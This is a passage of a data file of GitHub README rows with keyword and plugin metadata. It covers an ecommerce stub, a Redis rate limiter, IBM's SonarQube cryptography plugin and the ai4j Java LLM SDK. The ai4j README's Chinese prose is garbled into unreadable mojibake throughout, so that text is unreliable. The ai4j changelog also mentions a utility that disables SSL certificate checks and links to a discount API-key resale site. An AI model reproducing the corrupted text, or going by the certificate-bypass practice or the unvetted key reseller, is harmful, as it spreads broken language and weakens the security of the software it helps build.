'usage', 'local', 'bot', 'api', 'server', 'log', 'proxy', 'error', 'handle', 'conclusion']","['handler', 'filter', 'bot', 'update', 'p']",1.0,[],0.0,1.0,0.0
phegondev/Ecommerce-Springboot,master,"# Ecommerce Platform
## Clone the repository and check out the branch corresponding to the technology you are familiar with to view the source code

<img width=""1382"" alt=""home"" src=""https://github.com/user-attachments/assets/cee35157-33ac-472c-9137-7021ae168a9b"">

",0,0,3,0.0,"['ecommerce', 'platform', 'clone', 'repository', 'check', 'branch', 'correspond', 'technology', 'familiar', 'view', 'source', 'code']","['ecommerce', 'platform', 'clone', 'repository', 'check']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
Rapter1990/ratelimiter,main,"# RATE LIMITER WITH REDIS

<p align=""center"">
    <img src=""screenshots/spring_boot_rate_limiter_redis.png"" alt=""Main Information"" width=""850"" height=""600"">
</p>

### ğŸ“– Information

<ul style=""list-style-type:disc"">
  <li>This application is a <b>Spring Boot application</b> demonstrating rate limiting with Redis for user management operations.</li>
  <li>
    <b>Explanation:</b>
    <ul>
      <li><b>UserController:</b> The API endpoint for managing user information. It includes methods to handle creating, retrieving, updating, and deleting user data. This controller interacts with the UserService to perform these operations.</li>
      <li><b>UserService:</b> Contains the business logic for user management. It performs CRUD operations on the User entity and interacts with the RateLimiterService to apply rate limiting rules.</li>
      <li><b>RateLimiterService:</b> Utilizes Redis to track and enforce rate limiting rules. It ensures that the number of requests made by a user does not exceed the specified limit within a given time window.</li>
      <li><b>UserRepository:</b> Extends Spring Data JPA's JpaRepository, providing methods for performing database operations on user entities. This layer abstracts the data access operations, making it easier to manage user data.</li>
      <li><b>Redis Configuration:</b> Redis is configured to support rate limiting functionality. The configuration includes setting up a RedisTemplate for efficient data access and operations. This template handles the interactions with Redis, such as incrementing request counts and setting expiration times for keys, ensuring accurate rate limiting.</li>
      <li><b>Validation:</b> The application uses Hibernate Validator for validating user input. This ensures that the data passed to the API endpoints is in the correct format and adheres to the defined constraints.</li>
      <li><b>Exception Handling:</b> Custom exception handling mechanisms are implemented to manage various error scenarios, such as user not found, email already exists, and rate limit exceeded.</li>
    </ul>
  </li>
</ul>

### Explore Rest APIs

<table style=""width:100%"">
  <tr>
      <th>Method</th>
      <th>Url</th>
      <th>Description</th>
      <th>Request Body</th>
      <th>Header</th>
      <th>Valid Path Variable</th>
      <th>Request Param</th>
      <th>No Path Variable</th>
  </tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/users/save</td>
      <td>Create a new user</td>
      <td>CreateUserRequest</td>
      <td></td>
      <td></td>
      <td></td>
      <td></td>
  </tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/users/{id}</td>
      <td>Retrieve a user by ID</td>
      <td></td>
      <td></td>
      <td>{id} - Valid UUID</td>
      <td></td>
      <td></td>
  </tr>
  <tr>
      <td>PUT</td>
      <td>/api/v1/users/{id}</td>
      <td>Update an existing user</td>
      <td>UpdateUserRequest</td>
      <td></td>
      <td>{id} - Valid UUID</td>
      <td></td>
      <td></td>
  </tr>
  <tr>
      <td>DELETE</td>
      <td>/api/v1/users/{id}</td>
      <td>Delete a user by ID</td>
      <td></td>
      <td></td>
      <td>{id} - Valid UUID</td>
      <td></td>
      <td></td>
  </tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/users</td>
      <td>Retrieve a paginated list of users</td>
      <td>UserPagingRequest</td>
      <td></td>
      <td></td>
      <td></td>
      <td></td>
  </tr>
</table>


---
### Technologies


- Java 21
- Spring Boot 3.0
- Restful API
- Lombok
- Maven
- Junit5
- Mockito
- Integration Tests
- Docker
- Docker Compose
- CI/CD (Github Actions)
- Postman
- Spring Bean Validation

---
### Postman

```
Import postman collection under postman_collection folder
```

---
### Prerequisites

#### Define Variable in .env file

```
DATABASE_USERNAME={DATABASE_USERNAME}
DATABASE_PASSWORD={DATABASE_PASSWORD}
```

---
- Maven or Docker
---


### Docker Run
The application can be built and run by the `Docker` engine. The `Dockerfile` has multistage build, so you do not need to build and run separately.

Please follow directions shown below in order to build and run the application with Docker Compose file;

```sh
$ cd ratelimiter
$ docker-compose up -d
```

If you change anything in the project and run it on Docker, you can also use this command shown below

```sh
$ cd ratelimiter
$ docker-compose up --build
```

---
### Maven Run
To build and run the application with `Maven`, please follow the directions shown below;

```sh
$ cd ratelimiter
$ docker run --name redis -p 6379:6379 -d redis
$ mvn clean install
$ mvn spring-boot:run
```

---
### Docker Image Location

```
https://hub.docker.com/repository/docker/noyandocker/ratelimiter/general
```

---
### Screenshots

<details>
<summary>Click here to show the screenshots of project</summary>
    <p> Figure 1 </p>
    <img src =""screenshots/docker1.PNG"">
    <p> Figure 2 </p>
    <img src =""screenshots/1.PNG"">
    <p> Figure 3 </p>
    <img src =""screenshots/2.PNG"">
    <p> Figure 4 </p>
    <img src =""screenshots/3.PNG"">
    <p> Figure 5 </p>
    <img src =""screenshots/4.PNG"">
    <p> Figure 6 </p>
    <img src =""screenshots/5.PNG"">
    <p> Figure 7 </p>
    <img src =""screenshots/6.PNG"">
    <p> Figure 8 </p>
    <img src =""screenshots/docker2.PNG"">
</details>

### Contributors

- [Sercan Noyan GermiyanoÄŸlu](https://github.com/Rapter1990)",0,0,1,0.0,"['rate', 'limiter', 'with', 'redis', 'information', 'explore', 'rest', 'apis', 'technology', 'postman', 'prerequisite', 'define', 'variable', 'file', 'docker', 'run', 'maven', 'run', 'docker', 'image', 'location', 'screenshots', 'contributor']","['docker', 'run', 'rate', 'limiter', 'with']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
IBM/sonar-cryptography,main,"# Sonar Cryptography Plugin (CBOMkit-hyperion)

[![License](https://img.shields.io/github/license/IBM/sonar-cryptography.svg?)](https://opensource.org/licenses/Apache-2.0) <!--- long-description-skip-begin -->
[![Current Release](https://img.shields.io/github/release/IBM/sonar-cryptography.svg?logo=IBM)](https://github.com/IBM/sonar-cryptography/releases)


This repository contains a SonarQube Plugin that detects cryptographic assets 
in source code and generates [CBOM](https://cyclonedx.org/capabilities/cbom/).
It is part of **the [CBOMKit](https://github.com/IBM/cbomkit) toolset**.

## Version compatibility

| Plugin Version | SonarQube Version      |
|----------------|------------------------|
| 1.3.2 and up   | SonarQube 9.8 and up   | 
| 1.2.0 to 1.3.1 | SonarQube 9.8 and 10.4 |      


## Supported languages and libraries

| Language | Cryptographic Library                                                                         | Coverage | 
|----------|-----------------------------------------------------------------------------------------------|----------|
| Java     | [JCA](https://docs.oracle.com/javase/8/docs/technotes/guides/security/crypto/CryptoSpec.html) | 100%     |
|          | [BouncyCastle](https://github.com/bcgit/bc-java) (*light-weight API*)                         | 100%[^1] |
| Python   | [pyca/cryptography](https://cryptography.io/en/latest/)                                       | 100%     |


[^1]: We only cover the BouncyCastle *light-weight API* according to [this specification](https://javadoc.io/static/org.bouncycastle/bctls-jdk14/1.75/specifications.html)

> [!NOTE]
> The plugin is designed in a modular way so that it can be extended to support additional languages and recognition rules to support more libraries.
> - To add support for another language or cryptography library, see [*Extending the Sonar Cryptography Plugin to add support for another language or cryptography library*](./docs/LANGUAGE_SUPPORT.md)
> - If you just want to know more about the syntax for writing new detection rules, see [*Writing new detection rules for the Sonar Cryptography Plugin*](./docs/DETECTION_RULE_STRUCTURE.md)

## Installation

> [!NOTE] 
> To run the plugin, you need a running SonarQube instance with one of the supported 
> versions. If you don't have one but want to try the plugin, you can use the
> included Docker Compose to set up a development environment. See 
> [here](CONTRIBUTING.md#build) for instructions.

Copy the plugin (the JAR file from the [latest releases](https://github.com/IBM/sonar-cryptography/releases))
to `$SONARQUBE_HOME/extensions/plugins` and restart 
SonarQube ([more](https://docs.sonarqube.org/latest/setup-and-upgrade/install-a-plugin/)).

## Using

The plugin provides new inventory rules (IBM Cryptography Repository) regarding the use of cryptography for 
the supported languages.
If you enable these rules, a source code scan creates a cryptographic inventory by creating a 
[CBOM](https://cyclonedx.org/capabilities/cbom/) with all cryptographic assets and writing 
a `cbom.json` to the scan directory.

### Add Cryptography Rules to your Quality Profile

This plugin incorporates rules specifically focused on cryptography.

> To generate a Cryptography Bill of Materials (CBOM), it is mandatory to activate at 
> least one of these cryptography-related rules.

![Activate Rules Crypto Rules](docs/images/rules.png)

As of the current version, the plugin contains one single rule for creating a cryptographic inventory. 
Future updates may introduce additional rules to expand functionality.

### Scan Source Code

Now you can follow the [SonarQube documentation](https://docs.sonarqube.org/latest/analyzing-source-code/overview/) 
to start your first scan.

### Visualizing your CBOM

Once you have scanned your source code with the plugin, and obtained a `cbom.json` file, you can use [IBM's CBOM Viewer](https://www.zurich.ibm.com/cbom/) service to know more about it.
It provides you with general insights about the cryptography used in your source code and its compliance with post-quantum safety.
It also allows you to explore precisely each cryptography asset and its detailed specification, and displays where it appears in your code.

## Help and troubleshooting

If you encounter difficulties or unexpected results while installing the plugin with SonarQube, or when trying to scan a repository, please check out our guide [*Testing your configuration and troubleshooting*](docs/TROUBLESHOOTING.md) to run our plugin with step-by-step instructions.

## Contribution Guidelines

If you'd like to contribute to Sonar Cryptography Plugin, please take a look at our
[contribution guidelines](CONTRIBUTING.md). By participating, you are expected to uphold our [code of conduct](CODE_OF_CONDUCT.md).

We use [GitHub issues](https://github.com/IBM/sonar-cryptography/issues) for tracking requests and bugs. For questions
start a discussion using [GitHub Discussions](https://github.com/IBM/sonar-cryptography/discussions).

## License

[Apache License 2.0](LICENSE.txt)









",6,11,15,82.0,"['sonar', 'cryptography', 'plugin', 'version', 'compatibility', 'support', 'language', 'library', 'installation', 'use', 'add', 'cryptography', 'rule', 'quality', 'profile', 'scan', 'source', 'code', 'visualize', 'cbom', 'help', 'troubleshooting', 'contribution', 'guideline', 'license']","['cryptography', 'sonar', 'plugin', 'version', 'compatibility']",9.0,"[com.diffplug.spotless:spotless-maven-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.cyclonedx:cyclonedx-maven-plugin,org.sonarsource.sonar-packaging-maven-plugin:sonar-packaging-maven-plugin]",0.0,7.0,1.0
LnYo-Cly/ai4j,main,"![Maven Central](https://img.shields.io/maven-central/v/io.github.lnyo-cly/ai4j?color=blue)
# ai4j
ä¸€æ¬¾JavaSDKç”¨äºå¿«é€Ÿæ¥å…¥AIå¤§æ¨¡å‹åº”ç”¨ï¼Œæ•´åˆå¤šå¹³å°å¤§æ¨¡å‹ï¼Œå¦‚OpenAiã€Ollamaã€æ™ºè°±Zhipu(ChatGLM)ã€æ·±åº¦æ±‚ç´¢DeepSeekã€æœˆä¹‹æš—é¢Moonshot(Kimi)ã€è…¾è®¯æ··å…ƒHunyuanã€é›¶ä¸€ä¸‡ç‰©(01)ç­‰ç­‰ï¼Œæä¾›ç»Ÿä¸€çš„è¾“å…¥è¾“å‡º(å¯¹é½OpenAi)æ¶ˆé™¤å·®å¼‚åŒ–ï¼Œä¼˜åŒ–å‡½æ•°è°ƒç”¨(Tool Call)ï¼Œä¼˜åŒ–RAGè°ƒç”¨ã€æ”¯æŒå‘é‡æ•°æ®åº“(Pinecone)ï¼Œå¹¶ä¸”æ”¯æŒJDK1.8ï¼Œä¸ºç”¨æˆ·æä¾›å¿«é€Ÿæ•´åˆAIçš„èƒ½åŠ›ã€‚


## æ”¯æŒçš„å¹³å°
+ OpenAi
+ Zhipu(æ™ºè°±)
+ DeepSeek(æ·±åº¦æ±‚ç´¢)
+ Moonshot(æœˆä¹‹æš—é¢)
+ Hunyuan(è…¾è®¯æ··å…ƒ)
+ Lingyi(é›¶ä¸€ä¸‡ç‰©)
+ Ollama
+ å¾…æ·»åŠ (Qwen Llama MiniMax...)

## æ”¯æŒçš„æœåŠ¡
+ Chat Completionsï¼ˆæµå¼ä¸éæµå¼ï¼‰
+ Embedding
+ å¾…æ·»åŠ 

## ç‰¹æ€§
+ æ”¯æŒSpringä»¥åŠæ™®é€šJavaåº”ç”¨ã€æ”¯æŒJava 8ä»¥ä¸Šçš„åº”ç”¨
+ å¤šå¹³å°ã€å¤šæœåŠ¡
+ ç»Ÿä¸€çš„è¾“å…¥è¾“å‡º
+ ç»Ÿä¸€çš„é”™è¯¯å¤„ç†
+ æ”¯æŒæµå¼è¾“å‡ºã€‚æ”¯æŒå‡½æ•°è°ƒç”¨å‚æ•°æµå¼è¾“å‡º
+ è½»æ¾ä½¿ç”¨Tool Calls
+ æ”¯æŒå¤šä¸ªå‡½æ•°åŒæ—¶è°ƒç”¨ï¼ˆæ™ºè°±ä¸æ”¯æŒï¼‰
+ æ”¯æŒstream_optionsï¼Œæµå¼è¾“å‡ºç›´æ¥è·å–ç»Ÿè®¡token usage
+ æ”¯æŒRAGï¼Œå†…ç½®å‘é‡æ•°æ®åº“æ”¯æŒ: Pinecone
+ ä½¿ç”¨Tikaè¯»å–æ–‡ä»¶
+ Tokenç»Ÿè®¡`TikTokensUtil.java`

## æ›´æ–°æ—¥å¿—
+ [2024-09-26] ä¿®å¤æœ‰å…³Pineconeå‘é‡æ•°æ®åº“çš„ä¸€äº›é—®é¢˜ã€‚å‘å¸ƒ0.6.3ç‰ˆæœ¬
+ [2024-09-20] å¢åŠ å¯¹Ollamaå¹³å°çš„æ”¯æŒï¼Œå¹¶ä¿®å¤ä¸€äº›bugã€‚å‘å¸ƒ0.6.2ç‰ˆæœ¬
+ [2024-09-19] å¢åŠ é”™è¯¯å¤„ç†é“¾ï¼Œç»Ÿä¸€å¤„ç†ä¸ºopenaié”™è¯¯ç±»å‹; ä¿®å¤éƒ¨åˆ†æƒ…å†µä¸‹URLæ‹¼æ¥é—®é¢˜ï¼Œä¿®å¤æ‹¦æˆªå™¨ä¸­responseé‡å¤è°ƒç”¨è€Œå¯¼è‡´çš„å…³é—­é—®é¢˜ã€‚å‘å¸ƒ0.5.3ç‰ˆæœ¬
+ [2024-09-12] ä¿®å¤ä¸Šä¸ªé—®é¢˜OpenAiå‚æ•°å¯¼è‡´é”™è¯¯çš„é—æ¼ï¼Œå‘å¸ƒ0.5.2ç‰ˆæœ¬
+ [2024-09-12] ä¿®å¤SpringBoot 2.6ä»¥ä¸‹å¯¼è‡´OkHttpå˜ä¸º3.14ç‰ˆæœ¬çš„æŠ¥é”™é—®é¢˜ï¼›ä¿®å¤OpenAiå‚æ•°`parallel_tool_calls`åœ¨toolsä¸ºnullæ—¶çš„å¼‚å¸¸é—®é¢˜ã€‚å‘å¸ƒ0.5.1ç‰ˆæœ¬ã€‚
+ [2024-09-09] æ–°å¢é›¶ä¸€ä¸‡ç‰©å¤§æ¨¡å‹æ”¯æŒã€å‘å¸ƒ0.5.0ç‰ˆæœ¬ã€‚
+ [2024-09-02] æ–°å¢è…¾è®¯æ··å…ƒHunyuanå¹³å°æ”¯æŒï¼ˆæ³¨æ„ï¼šæ‰€éœ€apiKey å±äºSecretIdä¸SecretKeyçš„æ‹¼æ¥ï¼Œæ ¼å¼ä¸º {SecretId}.{SecretKey}ï¼‰ï¼Œå‘å¸ƒ0.4.0ç‰ˆæœ¬ã€‚
+ [2024-08-30] æ–°å¢å¯¹Moonshot(Kimi)å¹³å°çš„æ”¯æŒï¼Œå¢åŠ `OkHttpUtil.java`å®ç°å¿½ç•¥SSLè¯ä¹¦çš„æ ¡éªŒã€‚
+ [2024-08-29] æ–°å¢å¯¹DeepSeekå¹³å°çš„æ”¯æŒã€æ–°å¢stream_optionså¯ä»¥ç›´æ¥ç»Ÿè®¡usageã€æ–°å¢é”™è¯¯æ‹¦æˆªå™¨`ErrorInterceptor.java`ã€å‘å¸ƒ0.3.0ç‰ˆæœ¬ã€‚
+ [2024-08-29] ä¿®æ”¹SseListenerä»¥å…¼å®¹æ™ºè°±å‡½æ•°è°ƒç”¨ã€‚
+ [2024-08-28] æ·»åŠ tokenç»Ÿè®¡ã€æ·»åŠ æ™ºè°±AIçš„ChatæœåŠ¡ã€ä¼˜åŒ–å‡½æ•°è°ƒç”¨å¯ä»¥æ”¯æŒå¤šè½®å¤šå‡½æ•°ã€‚
+ [2024-08-17] å¢å¼ºSseListenerç›‘å¬å™¨åŠŸèƒ½ã€‚å‘å¸ƒ0.2.0ç‰ˆæœ¬ã€‚

## æ•™ç¨‹æ–‡æ¡£
+ [å¿«é€Ÿæ¥å…¥SpringBootã€æ¥å…¥æµå¼ä¸éæµå¼ä»¥åŠå‡½æ•°è°ƒç”¨](http://t.csdnimg.cn/iuIAW)
+ [Javaå¿«é€Ÿæ¥å…¥qwen2.5ã€llama3.1ç­‰Ollamaå¹³å°å¼€æºå¤§æ¨¡å‹](https://blog.csdn.net/qq_35650513/article/details/142408092?spm=1001.2014.3001.5501)
+ [Javaæ­å»ºæ³•å¾‹AIåŠ©æ‰‹ï¼Œå¿«é€Ÿå®ç°RAGåº”ç”¨](https://blog.csdn.net/qq_35650513/article/details/142568177?fromshare=blogdetail&sharetype=blogdetail&sharerId=142568177&sharerefer=PC&sharesource=qq_35650513&sharefrom=from_link)

## å…¶å®ƒæ”¯æŒ
+ [[ä½ä»·ä¸­è½¬å¹³å°] ä½ä»·ApiKeyâ€”é™æ—¶ç‰¹æƒ  0.7:1â€”æ”¯æŒæœ€æ–°o1æ¨¡å‹](https://api.trovebox.online/)

# å¿«é€Ÿå¼€å§‹
## å¯¼å…¥
### Gradle
```groovy
implementation group: 'io.github.lnyo-cly', name: 'ai4j', version: '${project.version}'
```

```groovy
implementation group: 'io.github.lnyo-cly', name: 'ai4j-spring-boot-stater', version: '${project.version}'
```


### Maven
```xml
<!-- éSpringåº”ç”¨ -->
<dependency>
    <groupId>io.github.lnyo-cly</groupId>
    <artifactId>ai4j</artifactId>
    <version>${project.version}</version>
</dependency>

```
```xml
<!-- Springåº”ç”¨ -->
<dependency>
    <groupId>io.github.lnyo-cly</groupId>
    <artifactId>ai4j-spring-boot-stater</artifactId>
    <version>${project.version}</version>
</dependency>
```

## è·å–AIæœåŠ¡å®ä¾‹

### éSpringè·å–
```java
    public void test_init(){
        OpenAiConfig openAiConfig = new OpenAiConfig();

        Configuration configuration = new Configuration();
        configuration.setOpenAiConfig(openAiConfig);

        HttpLoggingInterceptor httpLoggingInterceptor = new HttpLoggingInterceptor();
        httpLoggingInterceptor.setLevel(HttpLoggingInterceptor.Level.HEADERS);

        OkHttpClient okHttpClient = new OkHttpClient
                .Builder()
                .addInterceptor(httpLoggingInterceptor)
                .addInterceptor(new ErrorInterceptor())
                .connectTimeout(300, TimeUnit.SECONDS)
                .writeTimeout(300, TimeUnit.SECONDS)
                .readTimeout(300, TimeUnit.SECONDS)
                .proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(""127.0.0.1"",10809)))
                .build();
        configuration.setOkHttpClient(okHttpClient);

        AiService aiService = new AiService(configuration);

        embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);
        chatService = aiService.getChatService(PlatformType.getPlatform(""OPENAI""));

    }
```
### Springè·å–
```yml
# å›½å†…è®¿é—®é»˜è®¤éœ€è¦ä»£ç†
ai:
  openai:
    api-key: ""api-key""
  okhttp:
    proxy-port: 10809
    proxy-url: ""127.0.0.1""
  zhipu:
    api-key: ""xxx""
  #other...
```

```java
// æ³¨å…¥AiæœåŠ¡
@Autowired
private AiService aiService;

// è·å–éœ€è¦çš„æœåŠ¡å®ä¾‹
IChatService chatService = aiService.getChatService(PlatformType.OPENAI);
IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);
// ......
```

## ChatæœåŠ¡

### åŒæ­¥è¯·æ±‚è°ƒç”¨
```java

public void test_chat() throws Exception {
    // è·å–chatæœåŠ¡å®ä¾‹
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // æ„å»ºè¯·æ±‚å‚æ•°
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""é²è¿…ä¸ºä»€ä¹ˆæ‰“å‘¨æ ‘äºº""))
            .build();

    // å‘é€å¯¹è¯è¯·æ±‚
    ChatCompletionResponse response = chatService.chatCompletion(chatCompletion);

    System.out.println(response);
}

```

### æµå¼è°ƒç”¨
```java
public void test_chat_stream() throws Exception {
    // è·å–chatæœåŠ¡å®ä¾‹
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // æ„é€ è¯·æ±‚å‚æ•°
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""æŸ¥è¯¢åŒ—äº¬æ˜å¤©çš„å¤©æ°”""))
            .functions(""queryWeather"")
            .build();


    // æ„é€ ç›‘å¬å™¨
    SseListener sseListener = new SseListener() {
        @Override
        protected void send() {
            System.out.println(this.getCurrStr());
        }
    };
    // æ˜¾ç¤ºå‡½æ•°å‚æ•°ï¼Œé»˜è®¤ä¸æ˜¾ç¤º
    sseListener.setShowToolArgs(true);

    // å‘é€SSEè¯·æ±‚
    chatService.chatCompletionStream(chatCompletion, sseListener);

    System.out.println(sseListener.getOutput());

}
```

### å›¾ç‰‡è¯†åˆ«

```java
public void test_chat_image() throws Exception {
    // è·å–chatæœåŠ¡å®ä¾‹
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // æ„å»ºè¯·æ±‚å‚æ•°
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""å›¾ç‰‡ä¸­æœ‰ä»€ä¹ˆä¸œè¥¿"", ""https://cn.bing.com/images/search?view=detailV2&ccid=r0OnuYkv&id=9A07DE578F6ED50DB59DFEA5C675AC71845A6FC9&thid=OIP.r0OnuYkvsbqBrYk3kUT53AHaKX&mediaurl=https%3a%2f%2fimg.zcool.cn%2fcommunity%2f0104c15cd45b49a80121416816f1ec.jpg%401280w_1l_2o_100sh.jpg&exph=1792&expw=1280&q=%e5%b0%8f%e7%8c%ab%e5%9b%be%e7%89%87&simid=607987191780608963&FORM=IRPRST&ck=12127C1696CF374CB9D0F09AE99AFE69&selectedIndex=2&itb=0&qpvt=%e5%b0%8f%e7%8c%ab%e5%9b%be%e7%89%87""))
            .build();

    // å‘é€å¯¹è¯è¯·æ±‚
    ChatCompletionResponse response = chatService.chatCompletion(chatCompletion);

    System.out.println(response);
}
```

### å‡½æ•°è°ƒç”¨

```java
public void test_chat_tool_call() throws Exception {
    // è·å–chatæœåŠ¡å®ä¾‹
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // æ„å»ºè¯·æ±‚å‚æ•°
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""ä»Šå¤©åŒ—äº¬å¤©æ°”æ€ä¹ˆæ ·""))
            .functions(""queryWeather"")
            .build();

    // å‘é€å¯¹è¯è¯·æ±‚
    ChatCompletionResponse response = chatService.chatCompletion(chatCompletion);

    System.out.println(response);
}
```
#### å®šä¹‰å‡½æ•°
```java
@FunctionCall(name = ""queryWeather"", description = ""æŸ¥è¯¢ç›®æ ‡åœ°ç‚¹çš„å¤©æ°”é¢„æŠ¥"")
public class QueryWeatherFunction implements Function<QueryWeatherFunction.Request, String> {

    @Data
    @FunctionRequest
    public static class Request{
        @FunctionParameter(description = ""éœ€è¦æŸ¥è¯¢å¤©æ°”çš„ç›®æ ‡ä½ç½®, å¯ä»¥æ˜¯åŸå¸‚ä¸­æ–‡åã€åŸå¸‚æ‹¼éŸ³/è‹±æ–‡åã€çœå¸‚åç§°ç»„åˆã€IP åœ°å€ã€ç»çº¬åº¦"")
        private String location;
        @FunctionParameter(description = ""éœ€è¦æŸ¥è¯¢æœªæ¥å¤©æ°”çš„å¤©æ•°, æœ€å¤š15æ—¥"")
        private int days = 15;
        @FunctionParameter(description = ""é¢„æŠ¥çš„å¤©æ°”ç±»å‹ï¼Œdailyè¡¨ç¤ºé¢„æŠ¥å¤šå¤©å¤©æ°”ã€hourlyè¡¨ç¤ºé¢„æµ‹å½“å¤©24å¤©æ°”ã€nowä¸ºå½“å‰å¤©æ°”å®å†µ"")
        private Type type;
    }

    public enum Type{
        daily,
        hourly,
        now
    }

    @Override
    public String apply(Request request) {
        final String key = """";

        String url = String.format(""https://api.seniverse.com/v3/weather/%s.json?key=%s&location=%s&days=%d"",
                request.type.name(),
                key,
                request.location,
                request.days);


        OkHttpClient client = new OkHttpClient();

        okhttp3.Request http = new okhttp3.Request.Builder()
                .url(url)
                .get()
                .build();

        try (Response response = client.newCall(http).execute()) {
            if (response.isSuccessful()) {
                // è§£æå“åº”ä½“
                return response.body() != null ? response.body().string() : """";
            } else {
                return ""è·å–å¤©æ°”å¤±è´¥ å½“å‰å¤©æ°”æœªçŸ¥"";
            }
        } catch (Exception e) {
            // å¤„ç†å¼‚å¸¸
            e.printStackTrace();
            return ""è·å–å¤©æ°”å¤±è´¥ å½“å‰å¤©æ°”æœªçŸ¥"";
        }
    }

}
```

## EmbeddingæœåŠ¡

```java
public void test_embed() throws Exception {
    // è·å–embeddingæœåŠ¡å®ä¾‹
    IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);

    // æ„å»ºè¯·æ±‚å‚æ•°
    Embedding embeddingReq = Embedding.builder().input(""1+1"").build();

    // å‘é€embeddingè¯·æ±‚
    EmbeddingResponse embeddingResp = embeddingService.embedding(embeddingReq);

    System.out.println(embeddingResp);
}
```

## RAG
### é…ç½®å‘é‡æ•°æ®åº“
```yml
ai:
  vector:
    pinecone:
      url: """"
      key: """"
```
### è·å–å®ä¾‹
```java
@Autowired
private PineconeService pineconeService;
```
### æ’å…¥å‘é‡æ•°æ®åº“
```java
public void test_insert_vector_store() throws Exception {
    // è·å–embeddingæœåŠ¡å®ä¾‹
    IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);

    // Tikaè¯»å–fileæ–‡ä»¶å†…å®¹
    String fileContent = TikaUtil.parseFile(new File(""D:\\data\\test\\test.txt""));

    // åˆ†å‰²æ–‡æœ¬å†…å®¹
    RecursiveCharacterTextSplitter recursiveCharacterTextSplitter = new RecursiveCharacterTextSplitter(1000, 200);
    List<String> contentList = recursiveCharacterTextSplitter.splitText(fileContent);

    // è½¬ä¸ºå‘é‡
    Embedding build = Embedding.builder()
            .input(contentList)
            .model(""text-embedding-3-small"")
            .build();
    EmbeddingResponse embedding = embeddingService.embedding(build);
    List<List<Float>> vectors = embedding.getData().stream().map(EmbeddingObject::getEmbedding).collect(Collectors.toList());
    VertorDataEntity vertorDataEntity = new VertorDataEntity();
    vertorDataEntity.setVector(vectors);
    vertorDataEntity.setContent(contentList);
    
    // å‘é‡å­˜å‚¨
    Integer count = pineconeService.insert(vertorDataEntity, ""userId"");

}
```
### ä»å‘é‡æ•°æ®åº“æŸ¥è¯¢
```java
public void test_query_vector_store() throws Exception {
    // è·å–embeddingæœåŠ¡å®ä¾‹
    IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);

    // æ„å»ºè¦æŸ¥è¯¢çš„é—®é¢˜ï¼Œè½¬ä¸ºå‘é‡
    Embedding build = Embedding.builder()
            .input(""question"")
            .model(""text-embedding-3-small"")
            .build();
    EmbeddingResponse embedding = embeddingService.embedding(build);
    List<Float> question = embedding.getData().get(0).getEmbedding();

    // æ„å»ºå‘é‡æ•°æ®åº“çš„æŸ¥è¯¢å¯¹è±¡
    PineconeQuery pineconeQueryReq = PineconeQuery.builder()
            .namespace(""userId"")
            .vector(question)
            .build();

    String result = pineconeService.query(pineconeQueryReq, "" "");
    
    // æºå¸¦resultï¼Œä¸chatæœåŠ¡è¿›è¡Œå¯¹è¯
    // ......
}
```

### åˆ é™¤å‘é‡æ•°æ®åº“æ•°æ®
```java
public void test_delete_vector_store() throws Exception {
    // æ„å»ºå‚æ•°
    PineconeDelete pineconeDelete = PineconeDelete.builder()
                                    .deleteAll(true)
                                    .namespace(""userId"")
                                    .build();
    // åˆ é™¤
    Boolean res = pineconeService.delete(pineconeDelete);
}
```



# ä¸ºAI4Jæä¾›è´¡çŒ®
æ¬¢è¿æ‚¨å¯¹AI4Jæå‡ºå»ºè®®ã€æŠ¥å‘Šé—®é¢˜æˆ–è´¡çŒ®ä»£ç ã€‚æ‚¨å¯ä»¥æŒ‰ç…§ä»¥ä¸‹çš„æ–¹å¼ä¸ºAI4Jæä¾›è´¡çŒ®: 

## é—®é¢˜åé¦ˆ
è¯·ä½¿ç”¨GitHub Issueé¡µé¢æŠ¥å‘Šé—®é¢˜ã€‚å°½å¯èƒ½å…·ä½“åœ°è¯´æ˜å¦‚ä½•é‡ç°æ‚¨çš„é—®é¢˜ï¼ŒåŒ…æ‹¬æ“ä½œç³»ç»Ÿã€Javaç‰ˆæœ¬å’Œä»»ä½•ç›¸å…³æ—¥å¿—è·Ÿè¸ªç­‰è¯¦ç»†ä¿¡æ¯ã€‚

## PR
1. Fork æœ¬ä»“åº“å¹¶åˆ›å»ºæ‚¨çš„åˆ†æ”¯ã€‚
2. ç¼–å†™æ‚¨çš„ä»£ç ï¼Œå¹¶è¿›è¡Œæµ‹è¯•ã€‚
3. ç¡®ä¿æ‚¨çš„ä»£ç ç¬¦åˆç°æœ‰çš„æ ·å¼ã€‚
4. æäº¤æ—¶ç¼–å†™æ¸…æ™°çš„æ—¥å¿—ä¿¡æ¯ã€‚å¯¹äºå°çš„æ”¹åŠ¨ï¼Œå•è¡Œä¿¡æ¯å°±å¯ä»¥äº†ï¼Œä½†è¾ƒå¤§çš„æ”¹åŠ¨åº”è¯¥æœ‰è¯¦ç»†çš„æè¿°ã€‚
